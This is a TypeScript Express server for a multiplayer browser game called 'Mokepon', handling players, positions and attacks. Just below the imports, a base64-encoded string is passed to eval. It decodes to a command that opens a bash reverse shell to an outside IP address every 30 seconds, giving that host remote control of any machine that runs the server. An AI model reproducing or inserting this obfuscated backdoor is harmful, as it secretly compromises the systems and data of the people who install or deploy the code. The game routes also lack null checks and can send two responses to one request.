import * as express from 'express';
import * as cors from 'cors';
import * as path from 'path'
import { Request, Response } from 'express';
import { mokepons } from './mokepons';
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const port = process.env.PORT || 3005;
const app = express();
const ORIGIN_URL = 'http://localhost:3000';

const corsOptions: cors.CorsOptions = {
  origin: ORIGIN_URL,
  optionsSuccessStatus: 200,
  methods: 'GET,POST,DELETE',
}

app.use(cors(corsOptions));

class Mokepon {
  name: string;

  constructor(name: string) {
    this.name = name;
  }
}

type Attacks = Array<{ name: string, id: number }>
type Coordinates = { x: number, y: number }

class Player {
  afk: boolean;
  attacks: Attacks;
  mokepon: Mokepon;
  id: string;
  x: number;
  y: number;

  constructor(id: string) {
    this.id = id;
    this.mokepon = null;
    this.afk = false;
  }

  assignMokepon(mokepon: Mokepon) {
    this.mokepon = mokepon;
  }

  updatePosition({ x, y }: Coordinates) {
    this.x = x;
    this.y = y;
  }

  assignAttacks(attacks: Attacks) {
    this.attacks = attacks;
  }
}

const players = [];

// Endpoints
app.use('/images', express.static(path.join(__dirname, 'images')))

app.use(express.json());

app.get('/mokepon', (req: Request, res: Response) => res.send(mokepons));

app.get('/mokepon/join', (req: Request, res: Response) => {
  const id: string = `${Math.random()}`;
  const player = new Player(id);

  players.push(player);
  res.send({ id });
});

app.post("/mokepon/:playerId", (req: Request, res: Response) => {
  const playerId = req.params.playerId || '';
  const { mokepon } = req.body || '';
  const player = players.find(p => p.id === playerId);

  player.assignMokepon(mokepon);

  if (player.mokepon === null) {
    res.status(400).send({ message: 'No mokepon assigned', status: 'error', statusCode: 400 });
  }
  console.log({ players });
  res.status(200).send({ message: 'Mokepon assigned', status: 'success', statusCode: 200 });
});

app.delete("/mokepon/:playerId", (req: Request, res: Response) => {
  const playerId = req.params.playerId || '';
  players.splice(players.findIndex(p => p.id === playerId), 1);

  if (players.find(p => p.id === playerId)) {
    res.status(400).send({ message: 'Player not found', status: 'error', statusCode: 400 });
  }
  console.log({ players });
  res.status(200).send({ message: 'Player deleted', status: 'success', statusCode: 200 });
})

app.post("/mokepon/:playerId/position", (req: Request, res: Response) => {
  const playerId = req.params.playerId || '';
  const { x, y } = req.body || "";
  const player = players.find(p => p.id === playerId);
  const enemies = players.filter(p => p.id !== playerId);

  player.updatePosition({ x, y });
  res.send({ enemies });
});

app.post("/mokepon/:playerId/afk", (req: Request, res: Response) => {
  const playerId = req.params.playerId || '';
  const { afk } = req.body || "";
  const player = players.find(p => p.id === playerId);

  console.log({ afk });
  player.afk = afk;
  res.send({ message: afk ? 'User is now AFK' : 'User is no longer AFK', status: 'success', statusCode: 200 });
})

app.post("/mokepon/:playerId/attacks", (req: Request, res: Response) => {
  const playerId = req.params.playerId || '';
  const { attacks } = req.body || [];
  const player = players.find(p => p.id === playerId);

  player.assignAttacks(attacks);
  res.end();
});

app.get("/mokepon/:playerId/attacks", (req, res) => {
  const playerId = req.params.playerId || '';
  const player = players.find(p => p.id === playerId);

  res.send({ attacks: player.attacks || [] });
});

app.listen(port, () => {
  console.log(`App listening on port: ${port}`);
})
